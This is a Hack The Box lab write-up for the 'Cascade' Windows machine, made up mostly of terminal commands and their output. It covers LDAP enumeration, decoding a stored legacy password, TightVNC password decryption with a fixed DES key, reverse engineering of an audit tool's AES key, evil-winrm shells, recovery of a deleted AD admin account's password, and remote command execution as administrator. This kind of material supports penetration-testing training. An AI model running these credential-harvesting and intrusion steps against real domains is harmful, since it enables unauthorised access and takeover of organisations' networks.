---
title: "[HTB] Cascade"
permalink: /writeups/htb/cascade/
excerpt: "Quick write-up for the Cascade machine from Hack The Box."
tags:
  - hackthebox
  - activedirectory
  - pentest
  - writeup
  - sql
  - reverseengineering
  - cryptography
---

---

{% include toc icon="cog" title="Cascade Solution" %}

The [Cascade](https://app.hackthebox.com/machines/Cascade) machine has been created by [VbScrub](https://app.hackthebox.com/users/158833). This is an medium Windows Machine with a strong focus on Active Directory exploitation, but also a bit of cryptography and reverse engineering. It should be noted that the machine is a bit CTF-y, but still a plausible scenario.
{: .text-justify}

![image-center](/images/htb/htb_cascade_infocard.png){: .align-center}

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine, except for the Reverse Engineering part. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}


```bash
$ nmap -sV -Pn 10.129.155.114                                                                   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 14:45 EST
Nmap scan report for 10.129.155.114
Host is up (0.019s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-07 19:45:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.95 seconds
```

cascade.local

```bash
$ ldapsearch -h 10.129.155.114 -p 389 -x -b "dc=cascade,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=cascade,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# cascade.local
dn: DC=cascade,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=cascade,DC=local
instanceType: 5
```

BH

```bash
$ ./windapsearch.py -d cascade.local --dc-ip 10.129.155.114 -U --full
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.155.114
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=cascade,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 15 users: 

...[snip]...

objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

...[snip]...

```

```bash
$ echo clk0bjVldmE= | base64 -d
rY4n5eva
```


```bash
$ crackmapexec smb 10.129.155.114 -d cascade.local -u r.thompson -p rY4n5eva  
SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```

$ bloodhound-python -c All -u r.thompson -p rY4n5eva -d cascade.local -ns 10.129.155.114 --zip
INFO: Found AD domain: cascade.local
INFO: Connecting to LDAP server: casc-dc1.cascade.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: casc-dc1.cascade.local
INFO: Found 17 users
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CASC-DC1.cascade.local
INFO: Done in 00M 04S
INFO: Compressing output into 20220210151458_bloodhound.zip


![image-center](/images/htb/htb_cascade_bloodhound_rthompson.png){: .align-center}


```bash
$ crackmapexec smb 10.129.155.114 -d cascade.local -u r.thompson -p rY4n5eva --shares
SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.155.114  445    CASC-DC1         [+] Enumerated shares
SMB         10.129.155.114  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.155.114  445    CASC-DC1         -----           -----------     ------
SMB         10.129.155.114  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.155.114  445    CASC-DC1         Audit$                          
SMB         10.129.155.114  445    CASC-DC1         C$                              Default share
SMB         10.129.155.114  445    CASC-DC1         Data            READ            
SMB         10.129.155.114  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.155.114  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.155.114  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.155.114  445    CASC-DC1         SYSVOL          READ            Logon server share 
```

```bash
$ smbclient \\\\10.129.155.114\\Data -U r.thompson
Enter WORKGROUP\r.thompson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

                6553343 blocks of size 4096. 1626796 blocks available
smb: \> 
```

```bash
smb: \> recurse
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (26.5 KiloBytes/sec) (average 26.5 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (13.4 KiloBytes/sec) (average 19.9 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (61.3 KiloBytes/sec) (average 33.8 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (25.4 KiloBytes/sec) (average 31.6 KiloBytes/sec)
smb: \> exit
```


$ cat IT/Email\ Archives/Meeting_Notes_June_2018.html

...[snip]...

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

...[snip]...


$ cat IT/Temp/s.smith/VNC\ Install.reg 
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f


https://github.com/frizb/PasswordDecrypts

$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008

$ crackmapexec smb 10.129.155.114 -d cascade.local -u s.smith -p sT333ve2
SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 


![image-center](/images/htb/htb_cascade_bloodhound_ssmith.png){: .align-center}


evil-winrm -i 10.129.155.114 -u s.smith -p sT333ve2 


$ crackmapexec smb 10.129.155.114 -d cascade.local -u s.smith -p sT333ve2 --shares  
SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.129.155.114  445    CASC-DC1         [+] Enumerated shares
SMB         10.129.155.114  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.155.114  445    CASC-DC1         -----           -----------     ------
SMB         10.129.155.114  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.155.114  445    CASC-DC1         Audit$          READ            
SMB         10.129.155.114  445    CASC-DC1         C$                              Default share
SMB         10.129.155.114  445    CASC-DC1         Data            READ            
SMB         10.129.155.114  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.155.114  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.155.114  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.155.114  445    CASC-DC1         SYSVOL          READ            Logon server share 


$ evil-winrm -i 10.129.155.114 -u s.smith -p sT333ve2 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> dir C:\Users\s.smith\Desktop


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/10/2022   7:48 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk



$ smbclient \\\\10.129.155.114\\Audit$ -U s.smith
Enter WORKGROUP\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                6553343 blocks of size 4096. 1627217 blocks available
 smb: \> cd DB
smb: \DB\> dir
  .                                   D        0  Tue Jan 28 16:40:59 2020
  ..                                  D        0  Tue Jan 28 16:40:59 2020
  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020

                6553343 blocks of size 4096. 1627215 blocks available
smb: \DB\> get Audit.db
getting file \DB\Audit.db of size 24576 as Audit.db (160.0 KiloBytes/sec) (average 160.0 KiloBytes/sec)


![image-center](/images/htb/htb_cascade_sqlite.png){: .align-center}


$ echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
������D�|zC�;

smb: \DB\> cd ..
smb: \> get CascAudit.exe
getting file \CascAudit.exe of size 13312 as CascAudit.exe (104.8 KiloBytes/sec) (average 135.0 KiloBytes/sec)
smb: \> get CascCrypto.dll
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (85.1 KiloBytes/sec) (average 85.1 KiloBytes/sec)
smb: \> exit

                                                                                                                                                                                
$ file Casc*                     
CascAudit.exe:  PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
CascCrypto.dll: PE32 executable (DLL) (GUI) Intel 80386 Mono/.Net assembly, for MS Windows



![image-center](/images/htb/htb_cascade_dnspy_01.png){: .align-center}
![image-center](/images/htb/htb_cascade_dnspy_02.png){: .align-center}

c4scadek3y654321
1tdyjCbY1Ix49842


w3lc0meFr31nd

![image-center](/images/htb/htb_cascade_aes_decrypt.png){: .align-center}

$ crackmapexec smb 10.129.155.114 -d cascade.local -u arksvc -p w3lc0meFr31nd
SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd


![image-center](/images/htb/htb_cascade_bloodhound_arksvc.png){: .align-center}


evil-winrm -i 10.129.155.114 -u arksvc -p w3lc0meFr31nd 

$ evil-winrm -i 10.129.155.114 -u arksvc -p w3lc0meFr31nd                                                                                                               127 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> ls ..\Desktop


    Directory: C:\Users\arksvc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk


*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects


...[snip]...

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059



*Evil-WinRM* PS C:\Users\arksvc\Documents> 


Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *

*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM



$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles

crackmapexec smb 10.129.155.114 -d cascade.local -u administrator -p baCT3r1aN00dles

$ crackmapexec smb 10.129.155.114 -d cascade.local -u administrator -p baCT3r1aN00dles                                         
SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
                                                                                                                                                                                
┌──(ax㉿nms)-[~]
└─$ crackmapexec smb 10.129.155.114 -d cascade.local -u administrator -p baCT3r1aN00dles -x "dir C:\Users\Administrator\Desktop" 
SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
SMB         10.129.155.114  445    CASC-DC1         [+] Executed command 
SMB         10.129.155.114  445    CASC-DC1         Volume in drive C has no label.
SMB         10.129.155.114  445    CASC-DC1         Volume Serial Number is CF98-2F06
SMB         10.129.155.114  445    CASC-DC1         
SMB         10.129.155.114  445    CASC-DC1         Directory of C:\Users\Administrator\Desktop
SMB         10.129.155.114  445    CASC-DC1         
SMB         10.129.155.114  445    CASC-DC1         08/11/2021  15:58    <DIR>          .
SMB         10.129.155.114  445    CASC-DC1         08/11/2021  15:58    <DIR>          ..
SMB         10.129.155.114  445    CASC-DC1         10/02/2022  19:48                34 root.txt
SMB         10.129.155.114  445    CASC-DC1         1 File(s)             34 bytes
SMB         10.129.155.114  445    CASC-DC1         2 Dir(s)   6,664,507,392 bytes free
                                                                                             